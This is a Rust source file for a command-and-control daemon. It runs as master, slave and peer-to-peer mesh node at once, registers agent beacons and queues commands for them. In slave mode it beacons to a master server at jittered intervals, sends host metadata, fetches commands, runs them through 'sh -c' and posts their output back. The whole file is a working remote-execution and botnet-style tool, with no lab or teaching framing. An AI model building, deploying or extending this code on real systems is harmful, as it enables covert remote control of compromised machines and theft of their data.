//! C2 Daemon - Unified master/slave/node implementation
//!
//! This daemon can operate in multiple modes simultaneously:
//! - **Master**: Accepts connections from agents and dispatches commands
//! - **Slave**: Connects to a higher-level master and executes commands
//! - **Node**: Participates in P2P mesh network for decentralized communication

use std::collections::HashMap;
use std::sync::Arc;
use bytes::Bytes;
use clap::Parser;
use http_body_util::{BodyExt, Full};
use hyper::body::Incoming;
use hyper::service::service_fn;
use hyper::{Request, Response, StatusCode};
use hyper_util::rt::{TokioExecutor, TokioIo};
use tokio::sync::{Mutex, RwLock};
use tracing::{info, warn, error, debug};
use c2_system::common::{
    BeaconMessage, CommandMessage, CommandType,
    ResponseMessage, ResponseStatus, ChannelType, Priority,
    C2Config, AgentRole, AgentMetadata,
};
use uuid::Uuid;
use chrono::Utc;
use tokio::time::{sleep, Duration};

type ResBody = Full<Bytes>;

fn body_from<T: Into<Bytes>>(data: T) -> ResBody {
    Full::new(data.into())
}

#[derive(Parser, Debug)]
#[command(name = "c2-daemon")]
#[command(about = "Unified C2 daemon (master + slave + node)")]
#[command(long_about = "A resilient Command & Control daemon that can act as:
  - Master: Control agents and other daemons
  - Slave: Be controlled by a higher-level master
  - Node: Participate in P2P mesh network

All roles can run simultaneously in hybrid mode.")]
struct Args {
    /// Daemon name/identifier
    #[arg(short, long, default_value = "c2-daemon")]
    name: String,

    /// Daemon ID (auto-generated if not provided)
    #[arg(long)]
    id: Option<String>,

    /// Bind address for master mode
    #[arg(long, default_value = "0.0.0.0:8080")]
    bind: String,

    /// Master key for encryption
    #[arg(long, default_value = "default_master_key")]
    master_key: String,

    /// Log level
    #[arg(short, long, default_value = "info")]
    log_level: String,

    /// Enable master mode (accept agent connections)
    #[arg(long, default_value = "false")]
    master_enabled: bool,

    /// Enable slave mode (connect to master server)
    #[arg(long, default_value = "true")]
    slave_enabled: bool,

    /// Master server URL (for slave mode)
    #[arg(long)]
    master_server: Option<String>,

    /// Enable P2P node mode
    #[arg(long, default_value = "true")]
    p2p_enabled: bool,

    /// P2P bootstrap nodes
    #[arg(long)]
    p2p_bootstrap: Vec<String>,

    /// Beacon interval in milliseconds
    #[arg(long, default_value = "30000")]
    beacon_interval: u64,

    /// Jitter percentage (0.0 to 1.0)
    #[arg(long, default_value = "0.2")]
    jitter: f32,
}

/// Complete daemon state shared across all roles
struct DaemonState {
    /// Daemon identity
    id: Uuid,
    name: String,

    /// Role configuration
    master_enabled: bool,
    slave_enabled: bool,
    p2p_enabled: bool,

    /// Master mode state
    agents: Arc<RwLock<HashMap<Uuid, AgentConnection>>>,

    /// Slave mode state
    master_url: Option<String>,
    master_id: Option<Uuid>,

    /// Node mode state
    connected_peers: Arc<RwLock<HashMap<Uuid, PeerInfo>>>,

    /// Configuration
    config: C2Config,
    master_key: String,

    /// Pending commands from master (for slave mode)
    pending_commands: Arc<Mutex<Vec<CommandMessage>>>,

    /// Shutdown signal
    shutdown: Arc<RwLock<bool>>,
}

/// Agent connection info (for master mode)
#[derive(Debug, Clone)]
struct AgentConnection {
    id: Uuid,
    last_seen: chrono::DateTime<Utc>,
    channel: ChannelType,
    pending_commands: Vec<CommandMessage>,
    role: AgentRole,
}

/// Peer info for P2P connections
#[derive(Debug, Clone)]
struct PeerInfo {
    id: Uuid,
    address: String,
    last_seen: chrono::DateTime<Utc>,
    role: AgentRole,
}

impl DaemonState {
    fn new(args: &Args, id: Uuid) -> Self {
        let mut config = C2Config::default();
        config.agent.name = args.name.clone();
        config.agent.role = "hybrid".to_string();
        config.agent.master_server = args.master_server.clone();
        config.server.master_key = args.master_key.clone();
        config.server.bind_address = args.bind.parse().unwrap_or_else(|_| "0.0.0.0:8080".parse().unwrap());

        Self {
            id,
            name: args.name.clone(),
            master_enabled: args.master_enabled,
            slave_enabled: args.slave_enabled,
            p2p_enabled: args.p2p_enabled,
            agents: Arc::new(RwLock::new(HashMap::new())),
            master_url: args.master_server.clone(),
            master_id: None,
            connected_peers: Arc::new(RwLock::new(HashMap::new())),
            config,
            master_key: args.master_key.clone(),
            pending_commands: Arc::new(Mutex::new(Vec::new())),
            shutdown: Arc::new(RwLock::new(false)),
        }
    }

    async fn is_shutdown(&self) -> bool {
        *self.shutdown.read().await
    }

    async fn shutdown(&self) {
        *self.shutdown.write().await = true;
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();

    // Initialize logging
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive(format!("{}", args.log_level).parse()?)
        )
        .init();

    // Generate or use provided daemon ID
    let daemon_id = match &args.id {
        Some(id) => Uuid::parse_str(id)?,
        None => Uuid::new_v4(),
    };

    info!("========================================");
    info!("C2 Daemon starting...");
    info!("Name: {}", args.name);
    info!("ID: {}", daemon_id);
    info!("========================================");
    info!("Master mode: {}", if args.master_enabled { "enabled" } else { "disabled" });
    info!("Slave mode: {}", if args.slave_enabled { "enabled" } else { "disabled" });
    info!("P2P node mode: {}", if args.p2p_enabled { "enabled" } else { "disabled" });

    if let Some(ref master) = args.master_server {
        info!("Master server: {}", master);
    }

    if args.p2p_enabled && !args.p2p_bootstrap.is_empty() {
        info!("P2P bootstrap nodes: {:?}", args.p2p_bootstrap);
    }

    // Create shared state
    let state = Arc::new(DaemonState::new(&args, daemon_id));

    // Build role description
    let roles: Vec<&str> = [
        args.master_enabled.then_some("Master"),
        args.slave_enabled.then_some("Slave"),
        args.p2p_enabled.then_some("Node"),
    ].into_iter().flatten().collect();
    info!("Operating as: {}", roles.join(" + "));

    // Spawn master server task
    if args.master_enabled {
        let state_clone = state.clone();
        let bind = args.bind.clone();
        tokio::spawn(async move {
            run_master_server(state_clone, bind).await;
        });
    }

    // Spawn slave beacon task
    if args.slave_enabled {
        if let Some(master_url) = args.master_server.clone() {
            let state_clone = state.clone();
            let interval = args.beacon_interval;
            let jitter = args.jitter;
            tokio::spawn(async move {
                run_slave_beacon(state_clone, master_url, interval, jitter).await;
            });
        } else {
            warn!("Slave mode enabled but no master server specified");
        }
    }

    // Spawn P2P node task
    if args.p2p_enabled {
        let state_clone = state.clone();
        let bootstrap = args.p2p_bootstrap.clone();
        tokio::spawn(async move {
            run_p2p_node(state_clone, bootstrap).await;
        });
    }

    // Spawn command executor task
    let state_clone = state.clone();
    tokio::spawn(async move {
        execute_pending_commands(state_clone).await;
    });

    // Keep main task alive
    info!("Daemon running. Press Ctrl+C to stop.");
    tokio::signal::ctrl_c().await?;
    info!("Shutdown signal received...");
    state.shutdown().await;

    Ok(())
}

/// Run the master server (accepts agent connections)
async fn run_master_server(state: Arc<DaemonState>, bind: String) {
    info!("Starting master server on {}", bind);

    let addr: std::net::SocketAddr = bind.parse().unwrap_or_else(|_| "0.0.0.0:8080".parse().unwrap());
    let listener = match tokio::net::TcpListener::bind(addr).await {
        Ok(l) => l,
        Err(e) => {
            error!("Failed to bind {}: {}", addr, e);
            return;
        }
    };

    info!("Master server listening on http://{}", addr);

    loop {
        if state.is_shutdown().await {
            break;
        }

        let (stream, _peer) = match listener.accept().await {
            Ok(pair) => pair,
            Err(e) => {
                error!("Accept failed: {}", e);
                continue;
            }
        };

        let state = state.clone();
        tokio::spawn(async move {
            let io = TokioIo::new(stream);
            let service = service_fn(move |req| handle_master_request(req, state.clone()));
            if let Err(e) = hyper_util::server::conn::auto::Builder::new(TokioExecutor::new())
                .serve_connection(io, service)
                .await
            {
                error!("Connection error: {}", e);
            }
        });
    }
}

/// Handle incoming requests in master mode
async fn handle_master_request(
    req: Request<Incoming>,
    state: Arc<DaemonState>,
) -> Result<Response<ResBody>, hyper::Error> {
    let method = req.method().clone();
    let path = req.uri().path().to_string();

    debug!("Request: {} {}", method, path);

    let response = match (method.as_str(), path.as_str()) {
        ("POST", "/beacon") => {
            handle_beacon(req, state).await?
        }
        ("POST", "/command") => {
            handle_command(req, state).await?
        }
        ("POST", "/response") => {
            handle_response(req, state).await?
        }
        ("GET", "/agents") => {
            handle_list_agents(state).await?
        }
        ("GET", "/status") => {
            handle_status(state).await?
        }
        ("GET", "/health") => {
            Response::builder()
                .status(StatusCode::OK)
                .body(body_from("OK"))
                .unwrap()
        }
        _ => {
            warn!("Unknown route: {} {}", method, path);
            Response::builder()
                .status(StatusCode::NOT_FOUND)
                .body(body_from("Not Found"))
                .unwrap()
        }
    };

    Ok(response)
}

/// Handle agent beacon
async fn handle_beacon(
    req: Request<Incoming>,
    state: Arc<DaemonState>,
) -> Result<Response<ResBody>, hyper::Error> {
    let body = match req.into_body().collect().await {
        Ok(b) => b.to_bytes(),
        Err(e) => {
            error!("Failed to read body: {}", e);
            return Ok(Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body(body_from(""))
                .unwrap());
        }
    };

    let beacon: BeaconMessage = match serde_json::from_slice(&body) {
        Ok(b) => b,
        Err(e) => {
            error!("Failed to parse beacon: {}", e);
            return Ok(Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body(body_from(format!("Parse error: {}", e)))
                .unwrap());
        }
    };

    // Register/update agent
    let mut agents = state.agents.write().await;
    let role = beacon.metadata.as_ref()
        .map(|m| m.role.clone())
        .unwrap_or(AgentRole::Slave);

    agents.insert(
        beacon.agent_id,
        AgentConnection {
            id: beacon.agent_id,
            last_seen: beacon.timestamp,
            channel: ChannelType::Https,
            pending_commands: Vec::new(),
            role: role.clone(),
        },
    );
    info!("Agent beacon received: {} (role: {:?})", beacon.agent_id, role);

    // Get pending commands for this agent
    let commands: Vec<serde_json::Value> = vec![];

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "application/json")
        .body(body_from(serde_json::to_vec(&commands).unwrap()))
        .unwrap())
}

/// Handle command submission
async fn handle_command(
    req: Request<Incoming>,
    state: Arc<DaemonState>,
) -> Result<Response<ResBody>, hyper::Error> {
    let body = match req.into_body().collect().await {
        Ok(b) => b.to_bytes(),
        Err(e) => {
            error!("Failed to read body: {}", e);
            return Ok(Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body(body_from(""))
                .unwrap());
        }
    };

    #[derive(serde::Deserialize)]
    struct CmdReq {
        agent_id: String,
        command: String,
        #[serde(default)]
        timeout: Option<u64>,
    }

    let cmd_req: CmdReq = match serde_json::from_slice(&body) {
        Ok(c) => c,
        Err(e) => {
            error!("Failed to parse command request: {}", e);
            return Ok(Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body(body_from(format!("Parse error: {}", e)))
                .unwrap());
        }
    };

    let agent_id = match Uuid::parse_str(&cmd_req.agent_id) {
        Ok(id) => id,
        Err(e) => {
            error!("Invalid agent ID: {}", e);
            return Ok(Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body(body_from("Invalid agent ID"))
                .unwrap());
        }
    };

    let command = CommandMessage {
        id: Uuid::new_v4(),
        agent_id,
        command: CommandType::Execute {
            command: cmd_req.command,
            working_dir: None,
            timeout: cmd_req.timeout,
        },
        payload: None,
        priority: Priority::Normal,
        timeout: cmd_req.timeout,
        created_at: Utc::now(),
    };

    // Queue command for agent
    let mut agents = state.agents.write().await;
    if let Some(agent) = agents.get_mut(&agent_id) {
        agent.pending_commands.push(command.clone());
    }

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "application/json")
        .body(body_from(serde_json::json!({
            "command_id": command.id.to_string(),
            "status": "queued"
        }).to_string()))
        .unwrap())
}

/// Handle command response
async fn handle_response(
    req: Request<Incoming>,
    state: Arc<DaemonState>,
) -> Result<Response<ResBody>, hyper::Error> {
    let body = match req.into_body().collect().await {
        Ok(b) => b.to_bytes(),
        Err(e) => {
            error!("Failed to read body: {}", e);
            return Ok(Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body(body_from(""))
                .unwrap());
        }
    };

    let response: ResponseMessage = match serde_json::from_slice(&body) {
        Ok(r) => r,
        Err(e) => {
            error!("Failed to parse response: {}", e);
            return Ok(Response::builder()
                .status(StatusCode::BAD_REQUEST)
                .body(body_from(format!("Parse error: {}", e)))
                .unwrap());
        }
    };

    info!("Command {} completed: {:?}", response.command_id, response.status);

    // Remove completed command from pending queue
    let mut agents = state.agents.write().await;
    if let Some(agent) = agents.get_mut(&response.agent_id) {
        agent.pending_commands.retain(|c| c.id != response.command_id);
    }

    Ok(Response::builder()
        .status(StatusCode::OK)
        .body(body_from(""))
        .unwrap())
}

/// List connected agents
async fn handle_list_agents(
    state: Arc<DaemonState>,
) -> Result<Response<ResBody>, hyper::Error> {
    let agents = state.agents.read().await;
    let agent_list: Vec<_> = agents.values()
        .map(|a| serde_json::json!({
            "id": a.id.to_string(),
            "last_seen": a.last_seen.to_rfc3339(),
            "channel": format!("{:?}", a.channel),
            "pending_commands": a.pending_commands.len(),
            "role": format!("{:?}", a.role),
        }))
        .collect();

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "application/json")
        .body(body_from(serde_json::to_vec(&agent_list).unwrap()))
        .unwrap())
}

/// Get daemon status
async fn handle_status(
    state: Arc<DaemonState>,
) -> Result<Response<ResBody>, hyper::Error> {
    let agents_count = state.agents.read().await.len();
    let connected_peers = state.connected_peers.read().await;
    let peers_count = connected_peers.len();
    let peers: Vec<_> = connected_peers
        .values()
        .map(|p| serde_json::json!({
            "id": p.id.to_string(),
            "peer_id": p.address,
            "last_seen": p.last_seen.to_rfc3339(),
        }))
        .collect();
    let pending = state.pending_commands.lock().await.len();

    let status = serde_json::json!({
        "id": state.id.to_string(),
        "name": state.name,
        "roles": {
            "master": state.master_enabled,
            "slave": state.slave_enabled,
            "node": state.p2p_enabled,
        },
        "stats": {
            "connected_agents": agents_count,
            "connected_peers": peers_count,
            "pending_commands": pending,
        },
        "peers": peers,
        "master_server": state.master_url,
        "uptime": "active",
    });

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "application/json")
        .body(body_from(serde_json::to_vec(&status).unwrap()))
        .unwrap())
}

/// Run the slave beacon to communicate with master server
async fn run_slave_beacon(state: Arc<DaemonState>, master_url: String, interval_ms: u64, jitter: f32) {
    let base_interval = Duration::from_millis(interval_ms);

    info!("Starting slave beacon to master: {}", master_url);

    loop {
        if state.is_shutdown().await {
            break;
        }

        // Calculate jittered interval
        let jitter_amount = (base_interval.as_millis() as f32 * jitter) as i64;
        let offset = if jitter_amount > 0 {
            rand::random::<i64>().rem_euclid(jitter_amount * 2 + 1) - jitter_amount
        } else {
            0
        };
        let actual_interval = if offset >= 0 {
            base_interval + Duration::from_millis(offset as u64)
        } else {
            base_interval - Duration::from_millis((-offset) as u64)
        };

        // Build beacon message
        let beacon = BeaconMessage {
            agent_id: state.id,
            timestamp: Utc::now(),
            uptime: 0,
            last_seen: Utc::now(),
            capabilities: vec![
                "server".to_string(),
                "relay".to_string(),
                "p2p".to_string(),
            ],
            metadata: Some(AgentMetadata {
                hostname: state.name.clone(),
                username: "daemon".to_string(),
                os: "linux".to_string(),
                arch: "x86_64".to_string(),
                pid: std::process::id(),
                parent_pid: 1,
                working_dir: std::env::current_dir()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default(),
                environment: None,
                role: AgentRole::Hybrid,
                master_id: state.master_id,
                connected_nodes: state.connected_peers.read().await
                    .keys().cloned().collect(),
            }),
        };

        // Send beacon to master
        let client = reqwest::Client::new();
        let beacon_url = format!("{}/beacon", master_url.trim_end_matches('/'));

        match client.post(&beacon_url)
            .json(&beacon)
            .send()
            .await
        {
            Ok(resp) => {
                if resp.status().is_success() {
                    debug!("Slave beacon sent successfully");

                    // Process any commands from master
                    if let Ok(commands) = resp.json::<Vec<serde_json::Value>>().await {
                        if !commands.is_empty() {
                            let mut pending = state.pending_commands.lock().await;
                            for cmd in commands {
                                match serde_json::from_value::<CommandMessage>(cmd) {
                                    Ok(command) => {
                                        info!("Queued command from master: {}", command.id);
                                        pending.push(command);
                                    }
                                    Err(e) => warn!("Bad command from master: {}", e),
                                }
                            }
                        }
                    }
                }
            }
            Err(e) => {
                warn!("Slave beacon failed: {}", e);
            }
        }

        sleep(actual_interval).await;
    }
}

/// Run the P2P node for mesh network communication
async fn run_p2p_node(state: Arc<DaemonState>, bootstrap_nodes: Vec<String>) {
    use c2_system::protocols::{P2PChannel, P2PChannelConfig};

    info!("Starting P2P node (ID: {})", state.id);

    let channel = P2PChannel::new(P2PChannelConfig {
        enabled: true,
        bootstrap_nodes: bootstrap_nodes.clone(),
        ..Default::default()
    });
    if let Err(e) = channel.start().await {
        error!("P2P node failed to start: {}", e);
        return;
    }
    info!("P2P node started, bootstrap: {:?}", bootstrap_nodes);

    let heartbeat_interval = Duration::from_secs(30);

    loop {
        if state.is_shutdown().await {
            break;
        }

        let peers = channel.peer_count().await;
        let local = channel.local_peer_id();
        info!("P2P node heartbeat (peers: {}, id: {:?})", peers, local);

        let mut connected = state.connected_peers.write().await;
        connected.clear();
        for peer_id in channel.peer_ids().await {
            let id = Uuid::new_v5(&Uuid::NAMESPACE_OID, peer_id.as_bytes());
            connected.insert(
                id,
                PeerInfo {
                    id,
                    address: peer_id,
                    last_seen: Utc::now(),
                    role: AgentRole::Node,
                },
            );
        }

        sleep(heartbeat_interval).await;
    }
}

/// Execute pending commands received from master
async fn execute_pending_commands(state: Arc<DaemonState>) {
    info!("Command executor started");

    loop {
        if state.is_shutdown().await {
            break;
        }

        // Check for pending commands
        let commands: Vec<CommandMessage> = {
            let mut pending = state.pending_commands.lock().await;
            pending.drain(..).collect()
        };

        for command in commands {
            info!("Executing command: {:?}", command.command);
            let response = run_command(&state, &command).await;
            report_result(&state, response).await;
        }

        sleep(Duration::from_secs(1)).await;
    }
}

/// Run one command from the master and build its result message.
async fn run_command(state: &DaemonState, command: &CommandMessage) -> ResponseMessage {
    let (status, output, error) = match &command.command {
        CommandType::Execute { command: cmd, working_dir, timeout } => {
            let mut child = tokio::process::Command::new("sh");
            child.arg("-c").arg(cmd).kill_on_drop(true);
            if let Some(dir) = working_dir {
                child.current_dir(dir);
            }
            let result = match timeout.or(command.timeout) {
                Some(ms) => tokio::time::timeout(Duration::from_millis(ms), child.output())
                    .await
                    .ok(),
                None => Some(child.output().await),
            };
            match result {
                None => (ResponseStatus::Timeout, None, None),
                Some(Ok(out)) => {
                    info!("Command output: {}", String::from_utf8_lossy(&out.stdout));
                    if out.status.success() {
                        (ResponseStatus::Success, Some(out.stdout), None)
                    } else {
                        (
                            ResponseStatus::Failed,
                            Some(out.stdout),
                            Some(String::from_utf8_lossy(&out.stderr).to_string()),
                        )
                    }
                }
                Some(Err(e)) => (ResponseStatus::Failed, None, Some(e.to_string())),
            }
        }
        CommandType::Configure { .. } | CommandType::Lifecycle { .. } => {
            (ResponseStatus::Success, Some(b"applied".to_vec()), None)
        }
        other => (
            ResponseStatus::Failed,
            None,
            Some(format!("command type not implemented on daemon: {other:?}")),
        ),
    };

    ResponseMessage {
        command_id: command.id,
        agent_id: state.id,
        status,
        output,
        error,
        completed_at: Utc::now(),
    }
}

/// Post a command result back to the master server.
async fn report_result(state: &DaemonState, response: ResponseMessage) {
    let Some(master) = &state.master_url else {
        debug!("No master configured; result not reported");
        return;
    };
    let url = format!("{}/response", master.trim_end_matches('/'));
    match reqwest::Client::new().post(&url).json(&response).send().await {
        Ok(resp) if resp.status().is_success() => {
            info!("Result for command {} reported", response.command_id);
        }
        Ok(resp) => warn!("Master rejected result: {}", resp.status()),
        Err(e) => warn!("Failed to report result: {}", e),
    }
}
